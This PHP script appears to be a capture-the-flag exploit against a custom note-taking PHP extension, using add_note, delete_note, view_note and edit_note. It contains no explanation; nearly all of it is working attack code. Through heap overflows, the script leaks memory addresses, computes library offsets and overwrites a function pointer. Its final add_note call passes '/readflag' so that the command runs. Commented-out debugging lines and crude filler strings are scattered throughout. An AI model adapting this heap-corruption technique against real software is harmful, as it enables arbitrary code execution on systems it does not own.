<?php
// sleep(3);
// add_note("LMAO","LMAOLMAOFUCKYO\x55NICE");
// add_note("LMAO","LMAOLMAO\x00".$a."FUCKYO\x55NICE");
// sleep(2);

add_note("LMAO","AA");
add_note("LMAO","AA");
delete_note(0);
delete_note(1);
add_note("A","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAA\xff\x00\x00\x00\x00\x00\x00\x00");;
$z = view_note(0);
$v = 0;
for($i=0;$i<6;$i++){
	$v += ord($z[88+$i])<<($i*8);
}
$v = $v-($v&0xfff);
$v += 0x28;
delete_note(0);
add_note("A","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x05\x00\x00\x00\x00\x00".pack('P', $v+0x200000));
// add_note("A","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAA\xff\x00\x00\x00\x00\x00\x00\x00");
// add_note("A","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAA\xff\x00\x00\x00\x00\x00\x00\x00");
// sleep(5);
$r = view_note(0);
$rvvv = 0;
for($q=0;$q<0x50000;$q+=0x1000){
	$d = 0;
	for($i=0;$i<8;$i++){
		$d += ord($r[$q+$i])<<($i*8);
	}
	if($d == 0xb8f8){
		$rvvv = $q+$v+0x200000-0x28;
		break;
	}
}
// delete_note(5);


add_note("LMAO","AA");
add_note("LMAO","AA");
delete_note(1);
delete_note(2);

add_note("A","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAA\x10\x00\x00\x00\x00\x00\x00\x00".pack('P', $rvvv+0x4018+0x40-0x10));
add_note("A","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAA\x08\x00\x00\x00\x00\x00\x00\x00".pack('P', $rvvv+0x4018+0x40-0x10));
$rrf = view_note(1);
$tttt = 0;
for($i=0;$i<8;$i++){
	$tttt += ord($rrf[$i])<<($i*8);
}
// $tttt -= 0x14cc00;
// echo dechex($tttt)."\n";
echo $tttt;
// edit_note(1,pack('P', $tttt));
// sleep(1);
// echo "here\n";

add_note("LMAO","AA");
add_note("LMAO","AA");
add_note("LMAO","AA");
delete_note(2);
delete_note(3);
delete_note(4);

add_note("A","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAA\x10\x00\x00\x00\x00\x00\x00\x00".pack('P', $rvvv+0x4018));
add_note("A","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAA\x08\x00\x00\x00\x00\x00\x00\x00".pack('P', $rvvv+0x4018));
add_note("A","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAA\x08\x00\x00\x00\x00\x00\x00\x00".pack('P', $rvvv+0x4018));
edit_note(2,pack('P', $tttt-0xe3c30));

// 0xe3c30


add_note("/readflag","/readflag");
// dechex($tttt-0x14cc00);
// -0x14cc00

// 0x4018

// echo 'no';

// add_note("A","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");;
// delete_note(0);

// sleep(100);



// sleep(4);

// add_note("LMAO","LMAOLMAO\x00".$c."FUCKYO\x55NICE");

// add_note("LMAO",$c."LMAOLMAO\x00".$c."FUCKYO\x55NICE");
// add_note("LMAO",$c."LMAOLMAO\x00".$c."FUCKYO\x55NICE");
// add_note("LMAO",$c."LMAOLMAO\x00".$c."FUCKYO\x55NICE");
// add_note("LMAO",$c."LMAOLMAO\x00".$c."FUCKYO\x55NICE");
// echo view_note(2);



// for($i=0;$i<30000;$i++){
// 	if($z[$i][0] != 1337){
// 		var_dump("A");
// 	};
// }
// +0x0aa8
// $a = [1337,1337,1337,1337,1337];

// sdfsdf();
?>
-- EOF --